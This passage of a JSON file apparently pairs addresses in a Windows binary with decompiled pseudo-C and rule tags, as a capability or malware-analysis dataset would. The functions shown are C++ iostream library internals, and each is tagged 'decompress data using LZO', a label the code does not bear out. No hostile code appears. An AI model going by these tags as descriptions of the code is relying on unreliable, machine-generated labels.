fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.0049dc90();\n    if (cStack117 == '\\0') {\n        return extraout_ECX_03;\n    }\n    piVar6 = *(extraout_ECX_03 + *(*extraout_ECX_03 + -0xc) + 0x84);\n    if (piVar6 != NULL) {\n        (**(*piVar6 + 0x10))();\n        return extraout_ECX_03;\n    }\n    fcn.004bde60();\n    if (extraout_EDX == 1) {\n        fcn.004c2e40();\n        iVar10 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar10 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar10 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar10 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return extraout_ECX_03;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.0049dc90();\n    if (cStack201 == '\\0') {\n        return extraout_ECX;\n    }\n    iStack264 = *(*extraout_ECX + -0xc) + extraout_ECX;\n    if (*(iStack264 + 0x84) != NULL) {\n        (**(**(iStack264 + 0x84) + 0x1c))();\n        return extraout_ECX;\n    }\n    fcn.004bde60();\n    if (extraout_EDX_00 == 1) {\n        fcn.004c2e40();\n        iVar10 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar10 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar10 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar10 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return extraout_ECX;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    uStack268 = fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    uVar12 = 0x49c78e;\n    fcn.0049dc90(extraout_ECX_00, 0);\n    if (cStack285 == '\\0') {\n        return extraout_ECX_00;\n    }\n    auStack284[0] = 0;\n    iVar10 = *(*extraout_ECX_00 + -0xc) + extraout_ECX_00;\n    if (*(iVar10 + 0x84) != NULL) {\n        (**(**(iVar10 + 0x84) + 0x20))(*(iVar10 + 0x78), 0xffff, 0, 0xffff, iVar10, auStack284, 0x49c66e);\ncode_r0x0049c7e9:\n        if (auStack284[0] == 0) {\n            return extraout_ECX_00;\n        }\n        fcn.004bc500(auStack284[0] | *(extraout_ECX_00 + *(*extraout_ECX_00 + -0xc) + 0x14));\n        return extraout_ECX_00;\n    }\n    uVar11 = fcn.004bde60();\n    if (uVar11 >> 0x20 == 1) {\n        fcn.004c2e40(uVar11);\n        iVar10 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar10 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        piVar6 = fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40(uVar11);\n        iVar10 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar10 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            goto code_r0x0049c7e9;\n        }\n        fcn.004c32d0();\n        piVar6 = extraout_ECX_00;\n    }\n    fcn.004c2fb0();\n    uVar5 = fcn.0043a8e0(piVar6);\n    fcn.004c2fb0();\n    fcn.0043a8e0(uVar5);\n    piVar6 = *(extraout_ECX_01 + *(*extraout_ECX_01 + -0xc) + 0x7c);\n    if (piVar6 != NULL) {\n        uVar3 = (**(*piVar6 + 0x28))(10);\n        piVar6 = fcn.0049c8e0(uVar5, uVar12, uVar3);\n        return piVar6;\n    }\n    fcn.004bde60();\n    extraout_ECX_02[1] = 0;\n    fcn.0049dc90(extraout_ECX_02, 1);\n    if (cStack401 == '\\0') {\n        iVar9 = extraout_ECX_02[1];\n    }\n    else {\n        piVar6 = *(extraout_ECX_02 + *(*extraout_ECX_02 + -0xc) + 0x78);\n        piVar7 = piVar6[2];\n        if (piVar7 <= piVar6[3] && piVar6[3] != piVar7) goto code_r0x0049c9a7;\ncode_r0x0049c951:\n        iVar4 = (**(*piVar6 + 0x24))();\n        iVar9 = extraout_ECX_02[1];\n        iVar10 = iVar9 + 1;\n        piVar7 = in_stack_fffffe98;\n        if (iVar10 < in_stack_fffffe94) {\n            do {\n                if (iVar4 == -1) {\n                    uVar8 = 2;\ncode_r0x0049ca92:\n                    if (0 < in_stack_fffffe94) {\n                        *piVar7 = 0;\n                    }\n                    if (iVar9 == 0) {\ncode_r0x0049ca0d:\n                        uVar8 = uVar8 | 4;\n                    }\n                    else if (uVar8 == 0) {\n                        return extraout_ECX_02;\n                    }\n                    goto code_r0x0049ca65;\n                }\n                if (iVar4 == iStack352) {\n                    uVar8 = 0;\n                    goto code_r0x0049ca92;\n                }\n                in_stack_fffffe98 = piVar7 + 1;\n                *piVar7 = iVar4;\n                extraout_ECX_02[1] = iVar10;\n                piVar7 = piVar6[2];\n                if (piVar6[3] <= piVar7) {\n                    iVar4 = (**(*piVar6 + 0x28))();\n                    if (iVar4 != -1) goto code_r0x0049c99f;\ncode_r0x0049c9f0:\n                    iVar10 = extraout_ECX_02[1];\n                    if (in_stack_fffffe94 < 1) {\n                        if (iVar10 != 0) goto code_r0x0049c983;\n                        uVar8 = 6;\n                    }\n                    else {\n                        *in_stack_fffffe98 = 0;\n                        uVar8 = 2;\n                        if (iVar10 == 0) goto code_r0x0049ca0d;\n                    }\n                    goto code_r0x0049ca65;\n                }\n                iVar4 = *piVar7;\n                piVar6[2] = piVar7 + 1;\n                if (iVar4 == -1) goto code_r0x0049c9f0;\ncode_r0x0049c99f:\n                piVar7 = piVar6[2];\n                if (piVar6[3] <= piVar7) goto code_r0x0049c951;\ncode_r0x0049c9a7:\n                iVar9 = extraout_ECX_02[1];\n                iVar4 = *piVar7;\n                iVar10 = iVar9 + 1;\n                piVar7 = in_stack_fffffe98;\n                if (in_stack_fffffe94 <= iVar10) break;\n            } while( true );\n        }\n        if (iVar4 == -1) {\n            if (0 < in_stack_fffffe94) {\n                *in_stack_fffffe98 = 0;\n            }\n            uVar8 = 6;\n            if (iVar9 != 0) {\ncode_r0x0049c983:\n                uVar8 = 2;\n            }\n            goto code_r0x0049ca65;\n        }\n    }\n    if (0 < in_stack_fffffe94) {\n        *in_stack_fffffe98 = 0;\n    }\n    if (iVar9 != 0) {\n        return extraout_ECX_02;\n    }\n    uVar8 = 4;\ncode_r0x0049ca65:\n    fcn.004bc500(uVar8 | *(extraout_ECX_02 + *(*extraout_ECX_02 + -0xc) + 0x14));\n    return extraout_ECX_02;\n}\n",
        "token_count": 3318
    },
    "0049eef0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0049eef0(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int16_t *piVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0049f5a0();\n    if (var_20h != '\\0') {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        piVar2 = piVar1[5];\n        if (piVar2 < piVar1[6]) {\n            *piVar2 = arg_8h;\n            piVar1[5] = piVar2 + 1;\n        }\n        else {\n            arg_8h._0_2_ = (**(*piVar1 + 0x34))(arg_8h);\n        }\n        if (arg_8h == -1) {\n            fcn.004bc500(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 1);\n        }\n    }\n    iVar4 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar4 + 0xd) & 0x20) != 0) {\n        cVar3 = fcn.004bdfd0();\n        if ((cVar3 == '\\0') && (piVar1 = *(var_1ch + iVar4 + 0x78),  piVar1 != NULL)) {\n            iVar4 = (**(*piVar1 + 0x18))();\n            if (iVar4 == -1) {\n                fcn.004bc500(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 447
    },
    "0049f0c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0049f0c0(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = *(param_1 + *(*param_1 + -0xc) + 0x78);\n    if (piVar1 != NULL) {\n        iVar2 = (**(*piVar1 + 0x18))();\n        if (iVar2 == -1) {\n            fcn.004bc500(*(param_1 + *(*param_1 + -0xc) + 0x14) | 1);\n            return param_1;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 151
    },
    "0049f170": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0049f170(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    if ((*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 5) == 0) {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        (**(*piVar1 + 0x14))(piVar1, arg_8h, arg_ch, arg_10h, arg_14h, 0x10);\n        if ((var_34h & var_38h) == 0xffffffff) {\n            fcn.004bc500(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 310
    },
    "0049f290": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0049f290(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    uint32_t var_28h;\n    uint32_t var_24h;\n    uint var_ch;\n    \n    if ((*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 5) == 0) {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        (**(*piVar1 + 0x10))(piVar1, arg_8h, arg_ch, arg_10h, 0x10);\n        if ((var_24h & var_28h) == 0xffffffff) {\n            fcn.004bc500(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 236
    },
    "0049f470": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0049f470(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    \n    fcn.0049f5a0();\n    if (var_10h != '\\0') {\n        iVar3 = (**(**(in_ECX + *(*in_ECX + -0xc) + 0x78) + 0x30))(arg_8h, arg_ch);\n        if (arg_ch != iVar3) {\n            fcn.004bc500();\n        }\n    }\n    iVar3 = *(*var_ch + -0xc);\n    if ((*(var_ch + iVar3 + 0xd) & 0x20) != 0) {\n        cVar2 = fcn.004bdfd0();\n        if ((cVar2 == '\\0') && (piVar1 = *(var_ch + iVar3 + 0x78),  piVar1 != NULL)) {\n            iVar3 = (**(*piVar1 + 0x18))();\n            if (iVar3 == -1) {\n                fcn.004bc500(*(var_ch + *(*var_ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 340
    },
    "0049f5a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.0049f5a0(uchar *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint32_t extraout_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iStack24;\n    uint uStack20;\n    \n    *param_1 = 0;\n    iVar1 = *param_2;\n    *(param_1 + 4) = param_2;\n    uVar3 = *(iVar1 + -0xc) + param_2;\n    uVar5 = *(uVar3 + 0x14);\n    if (*(uVar3 + 0x70) != 0) {\n        if (uVar5 != 0) goto code_r0x0049f5c8;\n        fcn.0049f0c0();\n        uVar3 = param_2 + *(*param_2 + -0xc);\n        uVar5 = *(uVar3 + 0x14);\n    }\n    if (uVar5 == 0) {\n        *param_1 = 1;\n        return uVar3;\n    }\ncode_r0x0049f5c8:\n    uVar4 = uVar5 | 4;\n    if (*(uVar3 + 0x78) == 0) {\n        uVar4 = uVar5 | 5;\n    }\n    *(uVar3 + 0x14) = uVar4;\n    if ((*(uVar3 + 0x10) & uVar4) == 0) {\n        return uVar4;\n    }\n    fcn.004bdff0(\"basic_ios::clear\");\n    fcn.004aebe0(iStack24 + 0x6c);\n    fcn.004ba260(iStack24, uStack20);\n    fcn.004aed00();\n    fcn.004bc290(uStack20);\n    piVar2 = *(iStack24 + 0x78);\n    if (piVar2 != NULL) {\n        fcn.004aebe0(piVar2 + 7);\n        (**(*piVar2 + 8))(uStack20);\n        fcn.004aed50(uStack20);\n        fcn.004aed00();\n    }\n    return extraout_ECX;\n}\n",
        "token_count": 524
    },
    "0049f770": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.0049f770(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar4;\n    ulong uVar5;\n    int32_t *piVar6;\n    uint var_2eh;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0049f5a0();\n    if (var_20h == '\\0') goto code_r0x0049f809;\n    iVar4 = *(*in_ECX + -0xc) + in_ECX;\n    piVar6 = *(iVar4 + 0x80);\n    if (piVar6 == NULL) {\n        fcn.004bde60();\ncode_r0x0049f890:\n        uVar5 = fcn.004bde60();\n        piVar6 = uVar5;\n        if (uVar5 >> 0x20 == 1) {\n            fcn.004c2e40(piVar6);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) & 1) == 0) {\n                in_ECX = fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            else {\n                fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            fcn.0049f660();\n            piVar6 = in_ECX;\n            fcn.0043a8e0(in_ECX);\n        }\n        fcn.004c2e40(piVar6);\n        iVar4 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar4 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar4 + 0x10) & 1) != 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c2fb0();\n    }\n    else {\n        if (*(iVar4 + 0x76) == '\\0') {\n            if (*(iVar4 + 0x7c) == NULL) goto code_r0x0049f890;\n            var_2eh._0_2_ = (**(**(iVar4 + 0x7c) + 0x28))(0x20);\n            iVar2 = *in_ECX;\n            *(iVar4 + 0x74) = var_2eh;\n            *(iVar4 + 0x76) = 1;\n            iVar4 = *(iVar2 + -0xc) + in_ECX;\n        }\n        else {\n            var_2eh._0_2_ = *(iVar4 + 0x74);\n        }\n        (**(*piVar6 + 0x24))(*(iVar4 + 0x78), *(iVar4 + 0x78) == 0, iVar4, var_2eh, arg_8h);\n        if (extraout_DL != '\\0') {\n            fcn.004bc500();\n        }\n    }\ncode_r0x0049f809:\n    iVar4 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar4 + 0xd) & 0x20) != 0) {\n        cVar3 = fcn.004bdfd0();\n        if ((cVar3 == '\\0') && (piVar6 = *(var_1ch + iVar4 + 0x78),  piVar6 != NULL)) {\n            iVar4 = (**(*piVar6 + 0x18))();\n            if (iVar4 == -1) {\n                fcn.004bc500(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 927
    },
    "0049f910": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.0049f910(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    ushort uVar4;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar5;\n    ulong uVar6;\n    int32_t *piVar7;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0049f5a0();\n    if (var_20h == '\\0') goto code_r0x0049f9ba;\n    iVar5 = *(*in_ECX + -0xc) + in_ECX;\n    piVar7 = *(iVar5 + 0x80);\n    if (piVar7 == NULL) {\n        fcn.004bde60();\ncode_r0x0049fa40:\n        uVar6 = fcn.004bde60();\n        piVar7 = uVar6;\n        if (uVar6 >> 0x20 == 1) {\n            fcn.004c2e40(piVar7);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) & 1) == 0) {\n                in_ECX = fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            else {\n                fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            fcn.0049f660();\n            piVar7 = in_ECX;\n            fcn.0043a8e0(in_ECX);\n        }\n        fcn.004c2e40(piVar7);\n        iVar5 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar5 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar5 + 0x10) & 1) != 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c2fb0();\n    }\n    else {\n        if (*(iVar5 + 0x76) == '\\0') {\n            if (*(iVar5 + 0x7c) == NULL) goto code_r0x0049fa40;\n            uVar4 = (**(**(iVar5 + 0x7c) + 0x28))(0x20);\n            iVar2 = *in_ECX;\n            *(iVar5 + 0x74) = uVar4;\n            *(iVar5 + 0x76) = 1;\n            iVar5 = *(iVar2 + -0xc) + in_ECX;\n        }\n        else {\n            uVar4 = *(iVar5 + 0x74);\n        }\n        (**(*piVar7 + 8))(*(iVar5 + 0x78), *(iVar5 + 0x78) == 0, iVar5, uVar4, arg_8h);\n        if (extraout_DL != '\\0') {\n            fcn.004bc500();\n        }\n    }\ncode_r0x0049f9ba:\n    iVar5 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) {\n        cVar3 = fcn.004bdfd0();\n        if ((cVar3 == '\\0') && (piVar7 = *(var_1ch + iVar5 + 0x78),  piVar7 != NULL)) {\n            iVar5 = (**(*piVar7 + 0x18))();\n            if (iVar5 == -1) {\n                fcn.004bc500(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 933
    },
    "0049fac0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __thiscall fcn.0049fac0(int32_t *param_1, ulong param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    char cVar3;\n    ushort uVar4;\n    char extraout_DL;\n    int32_t iVar5;\n    ulong uVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0049f5a0(param_1);\n    if (var_20h == '\\0') goto code_r0x0049fb5a;\n    iVar5 = *(*param_1 + -0xc) + param_1;\n    piVar2 = *(iVar5 + 0x80);\n    if (piVar2 == NULL) {\n        fcn.004bde60();\ncode_r0x0049fbe0:\n        uVar6 = fcn.004bde60();\n        iVar7 = uVar6;\n        if (uVar6 >> 0x20 == 1) {\n            fcn.004c2e40(uVar6);\n            param_1 = param_1 + *(*param_1 + -0xc);\n            param_1[5] = param_1[5] | 1;\n            if ((*(param_1 + 4) & 1) == 0) {\n                iVar5 = fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            else {\n                fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            fcn.0049f660();\n            fcn.0043a8e0(iVar5);\n            iVar7 = iVar5;\n        }\n        fcn.004c2e40(iVar7);\n        iVar5 = *(*param_1 + -0xc);\n        puVar1 = param_1 + iVar5 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(param_1 + iVar5 + 0x10) & 1) != 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c2fb0();\n    }\n    else {\n        if (*(iVar5 + 0x76) == '\\0') {\n            if (*(iVar5 + 0x7c) == NULL) goto code_r0x0049fbe0;\n            uVar4 = (**(**(iVar5 + 0x7c) + 0x28))(0x20);\n            iVar7 = *param_1;\n            *(iVar5 + 0x74) = uVar4;\n            *(iVar5 + 0x76) = 1;\n            iVar5 = *(iVar7 + -0xc) + param_1;\n        }\n        else {\n            uVar4 = *(iVar5 + 0x74);\n        }\n        (**(*piVar2 + 0x1c))(*(iVar5 + 0x78), *(iVar5 + 0x78) == 0, iVar5, uVar4, param_2);\n        if (extraout_DL != '\\0') {\n            fcn.004bc500();\n        }\n    }\ncode_r0x0049fb5a:\n    iVar5 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) {\n        cVar3 = fcn.004bdfd0();\n        if ((cVar3 == '\\0') && (piVar2 = *(var_1ch + iVar5 + 0x78),  piVar2 != NULL)) {\n            iVar5 = (**(*piVar2 + 0x18))();\n            if (iVar5 == -1) {\n                fcn.004bc500(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 919
    },
    "0049fc60": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __thiscall fcn.0049fc60(int32_t *param_1, unkbyte10 param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    char cVar3;\n    ushort uVar4;\n    char extraout_DL;\n    int32_t iVar5;\n    ulong uVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0049f5a0(param_1);\n    if (var_20h == '\\0') goto code_r0x0049fcf4;\n    iVar5 = *(*param_1 + -0xc) + param_1;\n    piVar2 = *(iVar5 + 0x80);\n    if (piVar2 == NULL) {\n        fcn.004bde60();\ncode_r0x0049fd80:\n        uVar6 = fcn.004bde60();\n        iVar7 = uVar6;\n        if (uVar6 >> 0x20 == 1) {\n            fcn.004c2e40(uVar6);\n            param_1 = param_1 + *(*param_1 + -0xc);\n            param_1[5] = param_1[5] | 1;\n            if ((*(param_1 + 4) & 1) == 0) {\n                iVar5 = fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            else {\n                fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            fcn.0049f660();\n            fcn.0043a8e0(iVar5);\n            iVar7 = iVar5;\n        }\n        fcn.004c2e40(iVar7);\n        iVar5 = *(*param_1 + -0xc);\n        puVar1 = param_1 + iVar5 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(param_1 + iVar5 + 0x10) & 1) != 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c2fb0();\n    }\n    else {\n        if (*(iVar5 + 0x76) == '\\0') {\n            if (*(iVar5 + 0x7c) == NULL) goto code_r0x0049fd80;\n            uVar4 = (**(**(iVar5 + 0x7c) + 0x28))(0x20);\n            iVar7 = *param_1;\n            *(iVar5 + 0x74) = uVar4;\n            *(iVar5 + 0x76) = 1;\n            iVar5 = *(iVar7 + -0xc) + param_1;\n        }\n        else {\n            uVar4 = *(iVar5 + 0x74);\n        }\n        (**(*piVar2 + 0x20))(*(iVar5 + 0x78), *(iVar5 + 0x78) == 0, iVar5, uVar4, param_2);\n        if (extraout_DL != '\\0') {\n            fcn.004bc500();\n        }\n    }\ncode_r0x0049fcf4:\n    iVar5 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) {\n        cVar3 = fcn.004bdfd0();\n        if ((cVar3 == '\\0') && (piVar2 = *(var_1ch + iVar5 + 0x78),  piVar2 != NULL)) {\n            iVar5 = (**(*piVar2 + 0x18))();\n            if (iVar5 == -1) {\n                fcn.004bc500(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 920
    },
    "0049fe00": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.0049fe00(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar4;\n    ulong uVar5;\n    int32_t *piVar6;\n    uint var_2eh;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0049f5a0();\n    if (var_20h == '\\0') goto code_r0x0049fe99;\n    iVar4 = *(*in_ECX + -0xc) + in_ECX;\n    piVar6 = *(iVar4 + 0x80);\n    if (piVar6 == NULL) {\n        fcn.004bde60();\ncode_r0x0049ff20:\n        uVar5 = fcn.004bde60();\n        piVar6 = uVar5;\n        if (uVar5 >> 0x20 == 1) {\n            fcn.004c2e40(piVar6);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) & 1) == 0) {\n                in_ECX = fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            else {\n                fcn.004c32d0();\n                fcn.004c2fb0();\n            }\n            fcn.0049f660();\n            piVar6 = in_ECX;\n            fcn.0043a8e0(in_ECX);\n        }\n        fcn.004c2e40(piVar6);\n        iVar4 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar4 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar4 + 0x10) & 1) != 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c2fb0();\n    }\n    else {\n        if (*(iVar4 + 0x76) == '\\0') {\n            if (*(iVar4 + 0x7c) == NULL) goto code_r0x0049ff20;\n            var_2eh._0_2_ = (**(**(iVar4 + 0x7c) + 0x28))(0x20);\n            iVar2 = *in_ECX;\n            *(iVar4 + 0x74) = var_2eh;\n            *(iVar4 + 0x76) = 1;\n            iVar4 = *(iVar2 + -0xc) + in_ECX;\n        }\n        else {\n            var_2eh._0_2_ = *(iVar4 + 0x74);\n        }\n        (**(*piVar6 + 0xc))(*(iVar4 + 0x78), *(iVar4 + 0x78) == 0, iVar4, var_2eh, arg_8h);\n        if (extraout_DL != '\\0') {\n            fcn.004bc500();\n        }\n    }\ncode_r0x0049fe99:\n    iVar4 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar4 + 0xd) & 0x20) != 0) {\n        cVar3 = fcn.004bdfd0();\n        if ((cVar3 == '\\0') && (piVar6 = *(var_1ch + iVar4 + 0x78),  piVar6 != NULL)) {\n            iVar4 = (**(*piVar6 + 0x18))();\n            if (iVar4 == -1) {\n                fcn.004bc500(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 926
    },
    "0049ffa0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
